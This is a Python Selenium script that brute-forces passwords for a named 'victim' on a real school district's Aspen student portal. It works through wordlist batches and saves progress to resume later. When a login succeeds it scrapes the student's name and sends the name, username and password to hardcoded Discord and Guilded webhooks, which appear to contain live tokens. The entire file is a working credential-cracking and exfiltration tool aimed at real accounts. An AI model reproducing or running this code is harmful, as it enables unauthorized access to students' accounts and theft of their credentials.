#selenoim related modules n stuff
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

#webhook modules
import guilded_webhook as guilded
from dhooks import Webhook

from os import system

#other modules
import json
import datetime
import time

system('clear')

#open data from last thing
with open('stuff.json') as f:
  data = json.load(f)

#if an attack is unfinished ask to continue or start new
if data['nofin'] == "true":
	print("You have an unfinished attack, type o for overwrite and c for continue:")
	res = input()
	system("clear")
	if res == 'o':
		system("clear")
		print("Enter victim x2 username: ")
		target = input()
		system("clear")
	elif res == 'c':
		target = data['victim']
else:
	system("clear")
	print("Enter victim x2 username: ")
	target = input()
	system("clear")

#this defines the set of passwords that is being used
passlist = 'pass' + data['pass'] + '.txt'

if data['pass'] == '1':
	db = 'Chelmsford01'
	bd = 33
	sbd = int("0"+"1")
elif data['pass'] == '2':
	db = "Chelmsford34"
	bd = 66
	sbd = 34
elif data['pass'] == '3':
	db = 'Chelmsford67'
	bd = 101
	sbd = 67

#defining the chrome driver, and making sure it works with replit
options = Options()
options.add_argument('headless')
options.add_argument('--no-sandbox')
options.add_argument('--disable-dev-shm-usage')
driver = webdriver.Chrome(options=options)

#navigation to x2
driver.get("https://ma-chelmsford.myfollett.com/aspen/logon.do")

#defining the buttons and text boxes
userbox = driver.find_element_by_id("username")
passbox = driver.find_element_by_id("password")
logbutton = driver.find_element_by_id("logonButton")

#type out the name of the target 
userbox.send_keys(target)

#try 1 password
arq = open(passlist)


passbox.send_keys(db)
logbutton.click()
if driver.current_url == "https://ma-chelmsford.myfollett.com/aspen/logon.do":
	print("Password Incorrect : " + db)
	time.sleep(3)
	driver.find_element_by_id("closeButton").click()
	time.sleep(1)
elif driver.current_url == "https://ma-chelmsford.myfollett.com/aspen/home.do":
	print("Password Correct : " + db)
	exit()


linenum = sbd
var = int(data['pass'])
var = var + 1	
var = str(var)

#if password cant be found
for line in arq:
	if linenum >= bd:
		print("couldn't find password, please come back in an hour")
		d = {"pass" : var, "nofin" : "true","victim" : target}
		with open("stuff.json", "w") as json_file:
			json.dump(d,json_file)
		break

	#try a bunch of passwords
	else:
		password = line.strip()
		userbox = driver.find_element_by_id("username")
		passbox = driver.find_element_by_id("password")
		logbutton = driver.find_element_by_id("logonButton")
		passbox.send_keys(password)
		logbutton.click()

		#if password isnt correct try again
		if driver.current_url == "https://ma-chelmsford.myfollett.com/aspen/logon.do":
			print("Password Incorrect : " + password)
			time.sleep(3)
			driver.find_element_by_id("closeButton").click()
			time.sleep(1)
			linenum = linenum + 1

		#if password is correct send webhooks and reset everything
		elif driver.current_url == "https://ma-chelmsford.myfollett.com/aspen/home.do":
			info = driver.find_element_by_xpath('//*[@id="header"]/table[1]/tbody/tr/td[1]/table/tbody/tr[2]/td/span')
			info = str(info.text)
			info = info.split(", ")
			info = info[1] + ' ' + info[0]
			print("Password Correct : " + password)
			d = {"pass" : "1", "nofin" : "false","victim" : target}
			ea = str(info + ' : ' + target + ' : ' + password)
			ea = ea.lower()
			xy = open("crackedacc.txt", "w+")
			xy.write(str(info) + ' : ' + str(target) + ' : ' + str(password) + '\n')
			xy.close()
			guhook = guilded.Webhook('https://media.guilded.gg/webhooks/b356f709-fb70-4b09-9ed6-385a5281b590/RkIF86V0g6Ao6MaIwCSUqOm280yg0IQco6UQYSkcMswUkAYW6UKcYIECYWayGw2y0sCWuyCSYmg66I6qkaKG2')
			guhook.send(content=ea)
			dihook = Webhook('https://discord.com/api/webhooks/885609484267958403/KoyTKIFsrzFT0nnKpSUOrMg9YqtFe5h4TgMqOTlVBtkaoX26m_Gxyv50bGuxVMw4Jqqh')
			dihook.send(ea)
			with open("stuff.json", "w") as json_file:
				json.dump(d,json_file)
				break
